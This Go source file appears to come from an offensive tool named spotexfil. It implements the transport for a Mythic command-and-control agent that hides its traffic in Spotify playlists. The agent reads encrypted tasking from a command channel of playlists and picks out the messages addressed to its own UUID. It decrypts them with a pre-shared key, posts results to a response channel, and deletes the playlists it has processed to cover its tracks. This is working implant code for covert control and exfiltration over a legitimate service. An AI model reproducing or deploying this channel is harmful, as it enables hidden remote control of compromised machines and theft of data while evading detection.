package main

import (
	"context"
	"fmt"
	"sort"
	"sync"

	"github.com/sourcefrenchy/spotexfil/pkg/mythicmap"
	"github.com/sourcefrenchy/spotexfil/pkg/protocol"
	"github.com/sourcefrenchy/spotexfil/pkg/spotify"
)

// transport abstracts the network so the task loop is testable. The real
// implementation runs over pkg/spotify + pkg/protocol + pkg/mythicmap.
type transport interface {
	// readForMe reads the cmd channel, filters messages addressed to this
	// agent by envelope UUID, and returns the newest matching plaintext
	// plus the playlist seqs that were successfully processed (to clean).
	// A nil plaintext with nil error means "no message for me".
	readForMe(ctx context.Context) (uuid string, plaintext []byte, playlistSeqs []int, err error)
	// send writes an envelope to the res channel under the given seq.
	send(ctx context.Context, envelopeB64 string, seq int) error
	// clean deletes processed cmd-channel playlists by seq.
	clean(ctx context.Context, seqs []int) error
}

// spotifyTransport is the real transport over Spotify playlists.
type spotifyTransport struct {
	client *spotify.Client
	pass   string // transport passphrase (playlist chunk encryption key)
	key    []byte // Mythic AESPSK (nil = plaintext mode)

	mu   sync.RWMutex
	uuid string // current callback UUID (updated after checkin)
}

func newSpotifyTransport(client *spotify.Client, pass, uuid string, key []byte) *spotifyTransport {
	return &spotifyTransport{client: client, pass: pass, uuid: uuid, key: key}
}

func (t *spotifyTransport) setUUID(uuid string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.uuid = uuid
}

func (t *spotifyTransport) currentUUID() string {
	t.mu.RLock()
	defer t.mu.RUnlock()
	return t.uuid
}

func (t *spotifyTransport) readForMe(ctx context.Context) (string, []byte, []int, error) {
	uuid := t.currentUUID()
	groups, err := t.client.ReadC2Playlists(ctx, protocol.ChannelCmd, t.pass, -1)
	if err != nil {
		return "", nil, nil, err
	}
	envelopes := make(map[int]string, len(groups))
	for seq, metas := range groups {
		envelopes[seq] = protocol.ReassemblePayload(metas)
	}
	mine, seqs, err := filterForMe(envelopes, uuid, t.key)
	if err != nil {
		return "", nil, nil, err
	}
	if len(seqs) == 0 {
		return "", nil, nil, nil
	}
	latest := seqs[len(seqs)-1]
	return uuid, mine[latest], seqs, nil
}

func (t *spotifyTransport) send(ctx context.Context, envelopeB64 string, seq int) error {
	descs, err := protocol.ChunkPayload(envelopeB64, seq, protocol.ChannelRes, t.pass)
	if err != nil {
		return fmt.Errorf("chunk envelope: %w", err)
	}
	return t.client.WriteC2Playlists(ctx, descs)
}

func (t *spotifyTransport) clean(ctx context.Context, seqs []int) error {
	for _, s := range seqs {
		if err := t.client.CleanC2Playlists(ctx, protocol.ChannelCmd, t.pass, s); err != nil {
			return err
		}
	}
	return nil
}

// filterForMe selects envelopes addressed to uuid. Multiple agents share the
// cmd channel, so every reassembled envelope is checked with ExtractUUID
// BEFORE decrypting; foreign or unparseable envelopes are skipped (and never
// cleaned — they belong to other agents). Returns seq->plaintext for our
// envelopes and the seqs that were successfully processed (safe to clean).
func filterForMe(envelopes map[int]string, uuid string, key []byte) (map[int][]byte, []int, error) {
	mine := make(map[int][]byte)
	var seqs []int
	for seq, env := range envelopes {
		envUUID, err := mythicmap.ExtractUUID(env)
		if err != nil || envUUID != uuid {
			continue
		}
		_, plaintext, err := mythicmap.Decrypt(key, env)
		if err != nil {
			return nil, nil, fmt.Errorf("decrypt envelope seq %d: %w", seq, err)
		}
		mine[seq] = plaintext
		seqs = append(seqs, seq)
	}
	sort.Ints(seqs)
	return mine, seqs, nil
}
